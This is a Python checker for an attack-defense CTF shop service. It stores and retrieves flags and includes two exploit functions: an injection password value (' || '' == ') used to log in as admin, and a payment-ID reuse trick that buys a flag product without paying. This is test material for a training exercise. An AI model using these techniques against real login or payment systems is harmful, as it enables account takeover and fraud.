import random
import string
from bs4 import BeautifulSoup
import requests
from potee import ServiceBase

port = 8000
schema = "http"
srv = ServiceBase()

def gen_password(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

@srv.ping
def ping(host):
    r = requests.get(f"{schema}://{host}:{port}/", timeout=2)
    if r.status_code == 200:
        return 'pong'

@srv.put("auth")
def login(host, flag):
    password = gen_password(24)

    s = requests.Session()
    s.post(f"{schema}://{host}:{port}/",data={"login": "checker", "passwd": password, "action": "signup", "card": flag})
    r = s.post(f"{schema}://{host}:{port}/",data={"login": "checker", "passwd": password, "action": "signin", "card": flag})
    return s.cookies.get("session")

@srv.get('auth')
def login(host, session):
    s = requests.Session() 
    s.cookies.set("session", session)
    r = s.get(f"{schema}://{host}:{port}/inventory")
    s.get(f"http://{host}:{port}/delete")
    soup = BeautifulSoup(r.text, "html.parser")
    req = soup.find("h5", class_="card_details")
    return req.text.split(":")[1].strip()

@srv.put('buy')
def buy(host, flag):
    password = gen_password(24)

    s = requests.Session()
    s.post(f"{schema}://{host}:{port}/",data={"login": "client", "passwd": password, "action": "signup", "card": "1234567890"})
    s.post(f"{schema}://{host}:{port}/",data={"login": "client", "passwd": password, "action": "signin"})
    r = s.post(f"http://{host}:{port}/approve?product_id=1", data={"buy": "yes", "tag": flag})
    payment_id = r.url.partition('=')[2]
    s.get(f"http://{host}:{port}/delete")
    return f"{s.cookies.get('session')}:{payment_id}"

@srv.get('buy')
def buy(host, session_id):
    session, payment_id = session_id.split(":")
    s = requests.Session()
    s.cookies.set("session", session)
    r = s.post(f"http://{host}:{port}/check", data={"transaction": payment_id})
    s.get(f"http://{host}:{port}/delete")

    soup = BeautifulSoup(r.text, "html.parser")
    req = soup.find("li", class_="tag")
    return req.text.split(":")[-1].strip()


@srv.exploit("ssji")
def exploit(host):
    s = requests.Session()
    r = s.post(f"{schema}://{host}:{port}", data={"login": "admin", "passwd": "' || '' == '", "action": "signin"})
    soup = BeautifulSoup(r.text, "html.parser")
    req = soup.find("h3", class_="username")
    if req.text == 'admin':
        return 1


@srv.exploit("bussiness")
def exploit(host):
    username = "checker_test1337"
    session = requests.Session()
    session.post(f"http://{host}:{port}/",data={"login": username, "passwd": "supersecret", "action": "signup", "card": ""})
    session.post(f"http://{host}:{port}", data={"login": username, "passwd": "supersecret", "action": "signin", "card": ""})

    r = session.post(f"http://{host}:{port}/approve?product_id=1", data={"buy": "yes", "tag": "checker_tag"})
    payment_id = r.url.partition('=')[2]
    r = session.post(f"http://{host}:{port}/approve?product_id=3", data={"buy": "yes", "tag": "checker_tag"})
    r = session.get(f"http://{host}:{port}/buy?payment_id={payment_id}")
    
    r = session.get(f"http://{host}:{port}/inventory")
    soup = BeautifulSoup(r.text, "html.parser")
    req = soup.find_all("a", class_="product")[1]
    session.get(f"http://{host}:{port}/delete")
    
    if req.text == 'flag':
        return 1


    
if __name__ == "__main__":
    srv.run()